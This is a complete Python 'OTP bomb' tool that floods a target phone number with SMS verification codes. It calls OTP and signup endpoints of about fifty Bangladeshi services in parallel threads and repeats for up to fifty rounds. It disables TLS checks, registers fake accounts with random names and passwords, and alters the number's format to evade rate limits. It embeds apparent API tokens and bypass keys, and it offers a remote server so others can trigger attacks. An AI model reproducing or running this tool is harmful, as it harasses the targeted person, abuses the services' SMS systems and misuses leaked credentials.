#!/usr/bin/env python3
"""OTP Bomb Runner - Optimized Version (30 workers, fast)"""

import sys, os, json, random, hashlib, time, ssl, re
from urllib.parse import quote as urlquote
import urllib.request, urllib.error
from concurrent.futures import ThreadPoolExecutor, as_completed
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn

class ThreadingHTTPServer(ThreadingMixIn, HTTPServer):
    daemon_threads = True

UA = "Mozilla/5.0 (Linux; Android 11; Infinix X665B Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/150.0.7871.124 Mobile Safari/537.36"

FN = ['Rahim','Karim','Sajid','Tanvir','Fahim','Arif','Mehedi','Rakib','Nayem','Jubayer','Sakib','Tamim','Rafi','Sohel','Imran']
LN = ['Hasan','Ahmed','Islam','Rahman','Hossain','Alam','Uddin','Khan','Mia','Sarker','Chowdhury','Ali','Sikder','Das','Roy']
EC = 'abcdefghijklmnopqrstuvwxyz0123456789'
PC = 'abcdefghijkmnpqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789!@#$%'
DM = ['gmail.com','yahoo.com','outlook.com','hotmail.com']
ADDR = ['Dhaka','Chittagong','Sylhet','Rajshahi','Khulna']

CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE

# Buggy APIs that need + sign variants
BUGGY_APIS = {
    'aarong', 'bdjob', 'bengalmeat', 'chaldal', 'chorcha', 'esquire',
    'ghorerbazar', 'kabbik', 'kireibd', 'osudpotro', 'pbazaar',
    'propertywala', 'quizgiri', 'trucklagbe', 'unimart'
}

APIS = [
    'binge','admissiontaker','medico','chardike','apex4u','ghoori','mygp','shikho','redx',
    'fteducation','banglalink','bohubrihi','sheba','trucklagbe','osudpotro',
    'banglamed','cookups','arogga','chaldal','shohoz','bengalmeat','unimart',
    'cholpori','deeptoplay','paperfly','aarong','esquire','htmind','kireibd','kabbik',
    'cinespot','edutubebd','propertywala','perfumeshop','bookhouse',
    'watchzonebd','telicall','bdjob','chorcha','epharma','jachail','pbazaar','iscreen',
    'rabbithole','medeasy','jatri','shajgoj','iqralive','quizgiri','ghorerbazar','pathao','garibook','shadhin'
]

MAX_WORKERS = 30

def rn(): return random.choice(FN), random.choice(LN)
def re_(): return ''.join(random.choice(EC) for _ in range(random.randint(6,10))) + '@' + random.choice(DM)
def rp(): return ''.join(random.choice(PC) for _ in range(random.randint(8,12)))
def ra(): return random.choice(ADDR)

def fmt_phone(raw):
    raw = raw.strip()
    if raw.startswith('+880'):
        return {'raw': '0'+raw[4:], 'p880': raw[1:], 'plus': '+'+raw[1:], 'dash': '+88-'+'0'+raw[4:]}
    elif raw.startswith('0'):
        return {'raw': raw, 'p880': '880'+raw[1:], 'plus': '+880'+raw[1:], 'dash': '+88-'+raw}
    elif raw.startswith('880'):
        return {'raw': '0'+raw[3:], 'p880': raw, 'plus': '+'+raw, 'dash': '+88-'+'0'+raw[3:]}
    else:
        return {'raw': '0'+raw, 'p880': '880'+raw, 'plus': '+880'+raw, 'dash': '+88-'+'0'+raw}

def http_post(url, data, headers, timeout=5):
    req = urllib.request.Request(url, data=data.encode() if isinstance(data, str) else data, headers=headers, method='POST')
    try:
        urllib.request.urlopen(req, context=CTX, timeout=timeout).read()
        return 200
    except urllib.error.HTTPError as e:
        return e.code
    except:
        return 0

def http_get(url, headers, timeout=5):
    req = urllib.request.Request(url, headers=headers, method='GET')
    try:
        urllib.request.urlopen(req, context=CTX, timeout=timeout).read()
        return 200
    except urllib.error.HTTPError as e:
        return e.code
    except:
        return 0

def generate_variant(phone_str, round_num):
    """Generate phone variant with + at position for buggy APIs"""
    clean = re.sub(r'[+\-\s]', '', phone_str)
    if round_num < len(clean):
        return clean[:round_num] + '+' + clean[round_num:]
    return clean[:round_num % (len(clean)-1) + 1] + '-' + clean[round_num % (len(clean)-1) + 1:]

def build(api, phone, variant=None):
    fN, lN = rn()
    fun = f"{fN} {lN}"
    em = re_()
    pw = rp()
    pr = phone['raw']
    p8 = phone['p880']
    pp = phone['plus']
    
    # For buggy APIs, use variant phone
    if api in BUGGY_APIS and variant:
        vp = fmt_phone(variant)
        pr = vp['raw']
        p8 = vp['p880']
        pp = vp['plus']
    
    h = {'Content-Type': 'application/json', 'User-Agent': UA, 'Accept': '*/*'}
    
    try:
        if api == 'binge':
            return ('https://api.binge.buzz/api/v4/auth/otp/send', json.dumps({"phone": pp}), {**h, 'Origin': 'https://binge.buzz'})
        elif api == 'admissiontaker':
            return ('https://www.admissiontaker.site/api/send-reg-otp', json.dumps({"phone_number": pr}), h)
        elif api == 'medico':
            return ('https://api.v2.medico.bio/patient/passwordless-login', json.dumps({"phoneNumber": pr, "deviceId": pr, "channel": "web", "userType": "patient", "type": "newUser", "otpLength": 6}), h)
        elif api == 'chardike':
            return ('https://api.chardike.com/api/3f8d1e74-9a5c-4f2d-a7b1-6c8e2d91f4ab/', json.dumps({"phone": pr, "otp_type": "login", "from_request": "web"}), h)
        elif api == 'apex4u':
            return ('https://api.apex4u.com/api/auth/login', json.dumps({"phoneNumber": pr}), h)
        elif api == 'ghoori':
            return ('https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web&_lang=bn', json.dumps({"mobile_no": pr}), {**h, 'Origin': 'https://ghoorilearning.com'})
        elif api == 'mygp':
            return ('https://weblogin.grameenphone.com/backend/api/v1/otp', json.dumps({"msisdn": pr}), h)
        elif api == 'shikho':
            return ('https://api.shikho.com/auth/v2/send/sms', json.dumps({"phone": p8, "type": "student", "auth_type": "signup", "vendor": "shikho"}), h)
        elif api == 'redx':
            return ('https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp', json.dumps({"phoneNumber": pr}), h)
        elif api == 'fteducation':
            return ('https://webapp.ft.education/auth/registration', json.dumps({"name": fN, "mobile": p8, "fb_id": ""}), {**h, 'X-Inertia': 'true', 'X-Inertia-Version': '93ac2f75562c111176bdccff246ce6e7'})
        elif api == 'banglalink':
            return ('https://web-api.banglalink.net/api/v1/user/otp-login/request', json.dumps({"msisdn": pr, "secret": ""}), {**h, 'Origin': 'https://www.banglalink.net'})
        elif api == 'bohubrihi':
            return ('https://bb-api.bohubrihi.com/public/activity/otp', json.dumps({"phone": pr, "intent": "login"}), h)
        elif api == 'sheba':
            return ('https://accountkit.sheba.xyz/api/shoot-otp', json.dumps({"mobile": pp, "app_id": "8329815A6D1AE6DD", "api_token": "d1op1o9xvVPShfr2k3JNzUt4RamE84vOrYgX89bCPFKhpWuzitVVAD4uMpgM", "email": em, "name": fun}), h)
        elif api == 'trucklagbe':
            return ('https://tethys.trucklagbe.com/tl_gateway/tl_login/131/loginWithPhoneNo', json.dumps({"userType": "shipper", "phoneNo": pr}), {**h, 'X-Bypass-Auth-Key': 'b6253a42-50bf-444a-8017-cd1319f4e79b-b280108f-3bdc-4ea7-964e-07e841cb5c90'})
        elif api == 'osudpotro':
            return ('https://api.osudpotro.com/api/v1/users/send_otp', json.dumps({"mobile": phone['dash'], "deviceToken": "web", "language": "en", "os": "web"}), h)
        elif api == 'banglamed':
            return ('https://banglamed.net/preview/home-vue/auth/send-otp', json.dumps({"phone_number": pr, "mode": "register", "redirect_url": "", "email": em}), {**h, 'X-Requested-With': 'XMLHttpRequest'})
        elif api == 'cookups':
            return ('https://api.cookups.app/api/v1/subject/Session/actMaybeConstruct/n44gxxD91U6Y4C216iFzFg', json.dumps({"Action": ["GenerateOtp", {"Value_": ["BdMobileNumber", pp]}], "Constructor": ["NewFromId", {"SessionId": "c7208e9f-fd10-4ed5-98e0-2db5ea217316"}]}), {**h, 'Origin': 'https://cookups.app'})
        elif api == 'arogga':
            return ('https://api.arogga.com/auth/v1/sms/send?f=mweb&b=Chrome&v=149.0.7827.160&os=Android&osv=11', f"mobile={pr}&fcmToken=&referral=", {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': UA, 'Origin': 'https://www.arogga.com'})
        elif api == 'chaldal':
            return (f"https://chaldal.com/yolk/api-v4/Auth/RequestOtpVerificationWithApiKey?apiKey=ae1b1e1c&phoneNumber={urlquote(pp)}&retryAttempt=0", '{}', {**h, 'x-egg-clientapp': 'Omelette', 'x-egg-platform': 'Browser', 'x-egg-storeid': '1'})
        elif api == 'shohoz':
            return ('https://sso-live.shohoz.com/v1.0/web/auth/sign-up/request', json.dumps({"first_name": fN, "last_name": lN, "mobile_number": pr, "email": em, "gender": 1, "recaptcha": "", "password": pw}), {**h, 'X-Requested-With': 'XMLHttpRequest'})
        elif api == 'bengalmeat':
            return ('https://api.bengalmeat.com/auth/otp-login', json.dumps({"phone": pr}), h)
        elif api == 'unimart':
            dob = f"{random.randint(1,28):02d}-{random.randint(1,12):02d}-{random.randint(1995,2003)}"
            return ('https://myadmin.unimart.online/api/v1/auth/sign-up', json.dumps({"phone": pp, "dob": dob, "gender": "Male", "email": em, "password": pw, "name": fN}), {**h, 'authorization': 'null', 'storeid': '1'})
        elif api == 'cholpori':
            return ('https://www.cholpori.com/api/Auth/Register', json.dumps({"firstName": fN, "lastName": lN, "phoneNumber": pr, "role": "12"}), h)
        elif api == 'deeptoplay':
            return ('https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en', json.dumps({"number": pp}), {**h, 'Authorization': ''})
        elif api == 'paperfly':
            return ('https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php', json.dumps({"full_name": fun, "company_name": f"{fN} Corp", "email_address": em, "phone_number": pr}), {**h, 'device_identifier': 'undefined'})
        elif api == 'aarong':
            dob = f"{random.randint(1,28):02d}-{random.randint(1,12):02d}-{random.randint(1995,2005)}"
            return ('https://mcprod.aarong.com/graphql', json.dumps({"query": 'mutation createCustomerV2($firstname:String!,$lastname:String!,$mobile_number:String!,$email:String!,$dob:String!,$gender:Int!,$password:String!,$registered_from:String!){createCustomerV2(input:{firstname:$firstname,lastname:$lastname,mobile_number:$mobile_number,email:$email,dob:$dob,gender:$gender,password:$password,registered_from:$registered_from}){customer{firstname,lastname,email,mobile_number}}}', "variables": {"firstname": fN, "lastname": lN, "mobile_number": pr, "email": em, "dob": dob, "gender": "1", "password": pw, "registered_from": "Web"}}), {**h, 'store': 'default', 'Origin': 'https://www.aarong.com'})
        elif api == 'esquire':
            return ('https://api.ecommerce.esquireelectronicsltd.com/api/otp/generate-otp', json.dumps({"phoneNo": pr}), h)
        elif api == 'htmind':
            return ('https://api-manager.htmind.lol/v1/auth/web/send-otp', json.dumps({"phone": pr}), {**h, 'Origin': 'https://www.hellotask.app'})
        elif api == 'kireibd':
            return ('https://frontendapi.kireibd.com/api/v2/send-login-otp', json.dumps({"email": pr}), {**h, 'X-Requested-With': 'XMLHttpRequest'})
        elif api == 'kabbik':
            ct = round(time.time() * 1000)
            return ('https://api.kabbik.com/v1/auth/otpnew2', json.dumps({"msisdn": p8, "currentTimeLong": ct, "passKey": "gHxUjmKFwWPNHTGD"}), {**h, 'authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoiMjgyMCIsInJvbGUiOjEsImlhdCI6MTY2NTc0NjIyNX0.dSY47sipaGTI_OtsysFWw_kaKZKWHWRtp4vklstVgVc'})
        elif api == 'cinespot':
            return ('https://cinespot.mobi/otp/sent', f"_token=x&mobile_number={pr}", {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': UA, 'Origin': 'https://cinespot.mobi'})
        elif api == 'edutubebd':
            return ('https://accounts.edutubebd.com/register/verify-phone', json.dumps({"phone": pr, "token": "x"}), {**h, 'X-Inertia': 'true', 'X-Inertia-Version': 'dc64b7f6cd379f407dccfbdc5434ffb0'})
        elif api == 'propertywala':
            return ('https://propertywala.com/Handlers/AjaxHandler.ashx', f"task=authenticate&action=check&email={em}&mobile={pr}&mobileCode=880&password=&name=", {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': UA, 'X-Requested-With': 'XMLHttpRequest', 'Origin': 'https://propertywala.com', 'Cookie': 'locationId=20'})
        elif api == 'perfumeshop':
            return ('https://perfumeshop.com.bd/wp-admin/admin-ajax.php', f"action=psb_send_otp&phone={pr}&nonce=x", {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': UA, 'X-Requested-With': 'XMLHttpRequest', 'Origin': 'https://perfumeshop.com.bd'})
        elif api == 'bookhouse':
            return ('https://bookhouse.com.bd/register', f"_token=x&name={fun}&email={em}&mobile_no={pr}&password={pw}&password_confirmation={pw}&referral_code=", {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': UA, 'Origin': 'https://bookhouse.com.bd'})
        elif api == 'watchzonebd':
            return ('https://watchzonebd.com/customer/register', f"_token=x&loginDetail=&name={fun}&phone={pr}&email={em}&address={ra()}&password={pw}&password_confirmation={pw}", {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': UA, 'Origin': 'https://watchzonebd.com'})
        elif api == 'telicall':
            return ('https://api.telicall.com/banner/phone-verification', '{}', {**h, 'x-token': 'g4rqp88VdKknaqJOmR9KiKChN-dAYFanCZOikzOWjD4lZI299dQoqiq6zhmMEp_S', 'x-req-signature': 'Ca7sS+XcB6Cr7x93ayiypkdMTJZFad4EBEqOXexwcjk='})
        elif api == 'bdjob':
            return ('https://mybdjobs.bdjobs.com/r_OtpVerifyAcconut.asp', 'tid=1lE3l3C6767936i6XAOHnW&cat_Type=0&isTTC=false&hqs=&hIsFromFair=False&hUsernameType=mobile', {'Content-Type': 'application/x-www-form-urlencoded', 'User-Agent': UA, 'Origin': 'https://mybdjobs.bdjobs.com'})
        elif api == 'chorcha':
            return ('https://mujib.chorcha.net/auth/otp', json.dumps({"phone": pr, "otp": f"{random.randint(0,999999):06d}"}), {**h, 'authorization': 'Bearer undefined', 'x-pkg': 'com.chorcha.ai'})
        elif api == 'epharma':
            return ('https://epharma.com.bd/authentication/send-otp', f"number=%2B{p8}&recaptcha_token=", {**h, 'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://epharma.com.bd'})
        elif api == 'jachail':
            return ('https://auth.jachai.com/api/v1/otp/send-register-otp', json.dumps({"countryCode": "BD", "mobileNumber": pp, "mobileNumberOrEmail": pp, "userType": "USER"}), {**h, 'User-Agent': 'mobile-android', 'devicename': 'Infinix_Infinix X665B'})
        elif api == 'pbazaar':
            return (f'https://www.pbazaar.com/en/Registration/MobileNumber?ResultCode=0&MobileNumber={pr}&send-code=Send+Code', '', {'User-Agent': UA, 'Accept': 'text/html'})
        elif api == 'iscreen':
            return ('https://api.rockstreamer.com/otp/api/v1/phone/otp', json.dumps({"phone_number": pp}), {**h, 'authorization': 'Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9'})
        elif api == 'rabbithole':
            ct = int(time.time())
            hs = hashlib.sha256(f"{ct}rabbithole_secret".encode()).hexdigest()
            return ('https://apix.rabbitholebd.com/appv2/login/requestOTP', json.dumps({"mobile": pp}), {**h, 'current-time': str(ct), 'hash': hs})
        elif api == 'medeasy':
            return (f'https://api.medeasy.health/api/send-otp/{pp}/', '', {'Origin': 'https://medeasy.health'})
        elif api == 'jatri':
            return ('https://api.retail.jatri.co/auth/api/v1/send-otp', json.dumps({"phone": pr, "purpose": "USER_LOGIN", "deviceType": "WEB", "cloudFlareToken": "", "email": em, "name": fun}), {**h, 'token': 'cSkjXjjg3LC3KudSPgt2V9gjKK0thNW5Gk26nhHJpgQr2FtjDtgptCNLSnneTG0t'})
        elif api == 'shajgoj':
            return ('https://bk.shajgoj.com/api/customers/send-otp', json.dumps({"recaptcha": "", "phone": p8, "email": em}), h)
        elif api == 'iqralive':
            return (f'https://apibeta.iqra-live.com/api/v2/sent-otp/{pr}', '', {**h, 'Accept': 'application/json'})
        elif api == 'quizgiri':
            ts = str(int(time.time()))
            dg = hashlib.sha256(f"quizgiri_salt{ts}".encode()).hexdigest()
            return ('https://developer.quizgiri.xyz/api/v2.0/send-otp', json.dumps({"country_code": "+88", "phone": pr, "timestamp": ts, "digest": dg}), {**h, 'Authorization': 'Bearer'})
        elif api == 'ghorerbazar':
            return ('https://back-office.ghorerbazarbd.com/api/register-with-otp', json.dumps({"name": fun, "username": pr, "address": ra()}), {**h, 'User-Agent': 'Dart/3.9', 'authorization': 'GenericCommerceV1-SBW7583837NUDD82'})
        elif api == 'pathao':
            return ('https://api.pathao.com/v2/auth/register', json.dumps({"country_prefix": "880", "national_number": pr[1:], "country_id": 1}), {**h, 'User-Agent': 'okhttp/5.1.0', 'App-Agent': 'ride/android/537'})
        elif api == 'garibook':
            return ('https://api.garibookadmin.com/api/v4/user/login', json.dumps({"mobile": pp, "gb_code": "IKiyBy55yYkaF8U"}), {**h, 'User-Agent': 'Dart/3.12 (dart:io)', 'authorization': 'Bearer'})
        elif api == 'shadhin':
            return ('https://connect.shadhinmusic.com/v1/api/otp/send', json.dumps({"action": "Forget", "msisdn": p8, "serviceName": "Shadhin Music", "user": "sh@dHinOTP"}), {**h, 'User-Agent': 'ShadhinMusic v4.4.2'})
    except:
        pass
    return None

def call_one(api, phone, variant=None):
    t0 = time.time()
    req = build(api, phone, variant)
    if not req:
        return {'api': api, 'status': 0, 'time_ms': 0}
    url, body, headers = req
    if body == '' or body == '{}':
        status = http_get(url, headers, 5)
    elif 'application/x-www-form-urlencoded' in str(headers.get('Content-Type', '')):
        status = http_post(url, body, headers, 5)
    else:
        status = http_post(url, body, headers, 5)
    return {'api': api, 'status': status, 'time_ms': round((time.time()-t0)*1000)}

def fire_round(phone, variant=None):
    results = []
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as pool:
        futures = {pool.submit(call_one, api, phone, variant): api for api in APIS}
        for f in as_completed(futures):
            try:
                results.append(f.result())
            except:
                pass
    return results

def run(phone_str, rounds):
    phone = fmt_phone(phone_str)
    t0 = time.time()
    all_results = {}
    
    for r in range(1, rounds + 1):
        # Generate variant for buggy APIs (position starts at 1, not 0)
        variant = generate_variant(phone_str, r)
        
        results = fire_round(phone, variant)
        all_results[f"round_{r}"] = {
            item['api']: {'status': item['status'], 'time_ms': item['time_ms'], 'phone_variant': variant if item['api'] in BUGGY_APIS else phone_str}
            for item in sorted(results, key=lambda x: x['api'])
        }
    
    total_time = round((time.time() - t0) * 1000)
    total = sum(len(v) for v in all_results.values())
    ok_count = sum(1 for v in all_results.values() for item in v.values() if 200 <= item['status'] < 300)
    
    return {
        'phone': phone_str,
        'rounds': rounds,
        'buggy_apis': list(BUGGY_APIS),
        'total_hits': total,
        'ok': ok_count,
        'fail': total - ok_count,
        'total_time_ms': total_time,
        'results': all_results
    }

def start_server(port=8080):
    SECRET = os.environ.get('API_SECRET', 'SuSHiLx2024SMS')
    
    class Handler(BaseHTTPRequestHandler):
        def do_GET(self):
            from urllib.parse import parse_qs, urlparse
            q = parse_qs(urlparse(self.path).query)
            phone = q.get('phone', [''])[0]
            rounds = min(max(int(q.get('rounds', ['1'])[0]), 1), 50)
            key = q.get('key', [''])[0]
            
            if key != SECRET:
                self.send_response(403)
                self.end_headers()
                self.wfile.write(b'Forbidden')
                return
            
            if phone and len(phone) >= 10:
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                import threading
                def fire_bg():
                    run(phone, rounds)
                threading.Thread(target=fire_bg, daemon=True).start()
                resp = json.dumps({'status': 'started', 'phone': phone, 'rounds': rounds, 'total_apis': len(APIS), 'total_hits': len(APIS) * rounds, 'msg': f'Robort started! {len(APIS) * rounds} SMS pathano hocche.'})
                self.wfile.write(resp.encode())
            else:
                self.send_response(400)
                self.end_headers()
                self.wfile.write(b'Invalid phone')
        
        def log_message(self, format, *args):
            pass
    
    print(f"""
OTP BOMB RUNNER (Optimized)
===========================
Server: http://0.0.0.0:{port}
APIs:   {len(APIS)} total
Workers: {MAX_WORKERS} threads
""")
    server = ThreadingHTTPServer(('0.0.0.0', port), Handler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nServer stopped.")

if __name__ == '__main__':
    if '--server' in sys.argv or '-s' in sys.argv:
        p = int(os.environ.get('PORT', 8080))
        for i, a in enumerate(sys.argv):
            if a == '--port' and i + 1 < len(sys.argv):
                p = int(sys.argv[i + 1])
        start_server(p)
    elif len(sys.argv) >= 2 and any(c.isdigit() for c in sys.argv[1]):
        phone = sys.argv[1]
        rounds = int(sys.argv[2]) if len(sys.argv) >= 3 else 1
        print(f"Fire: {phone} x {rounds} rounds ({len(APIS) * rounds} hits)")
        result = run(phone, rounds)
        print(json.dumps(result, indent=2))
    else:
        print("""
Usage:
  python runner.py 017XXXXXXXX 5
  python runner.py --server --port 8080
""")
